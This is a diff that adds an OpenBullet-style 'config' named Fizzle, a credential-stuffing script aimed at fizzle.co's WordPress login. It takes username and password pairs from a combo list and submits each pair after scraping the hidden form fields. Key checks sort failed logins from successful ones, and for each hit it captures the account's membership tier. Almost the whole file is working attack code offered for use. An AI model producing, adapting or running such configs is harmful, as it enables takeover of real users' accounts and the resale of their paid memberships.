@@ -1,0 +1,54 @@
+[SETTINGS]
+{
+  "Name": "Fizzle",
+  "SuggestedBots": 5,
+  "LastModified": "2018-05-19T22:07:43.0000163+00:00",
+  "AdditionalInfo": "",
+  "Author": "Jeff199",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_LOGIN_PAGE REQUEST GET "https://fizzle.co/wp-login.php" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_REMEMBERME PARSE "<SOURCE>" CSS "[name=rememberme]" "value" 0 -> VAR "REMEMBERME" "" "" 
+#PARSE_WP-SUBMIT PARSE "<SOURCE>" CSS "[name=wp-submit]" "value" 0 -> VAR "WP-SUBMIT" "" "" 
+#PARSE_REDIRECT_TO PARSE "<SOURCE>" CSS "[name=redirect_to]" "value" 0 -> VAR "REDIRECT_TO" "" "" 
+#PARSE_TESTCOOKIE PARSE "<SOURCE>" CSS "[name=testcookie]" "value" 0 -> VAR "TESTCOOKIE" "" "" 
+#POST_LOGIN REQUEST POST "https://fizzle.co/wp-login.php" AutoRedirect=TRUE 
+  CONTENT "log=<USER>&pwd=<PASS>&rememberme=<REMEMBERME>&wp-submit=<WP-SUBMIT>&redirect_to=<REDIRECT_TO>&testcookie=<TESTCOOKIE>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "The password you entered for the email address" 
+    KEY "Invalid username" 
+  KEYCHAIN Success OR 
+    KEY "Roadmap Stages" 
+#account_info REQUEST GET "https://fizzle.co/account" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "<p class=\"lede\">Your membership is <strong>" "</strong>.</p>" Recursive=FALSE -> CAP "" "" "" 
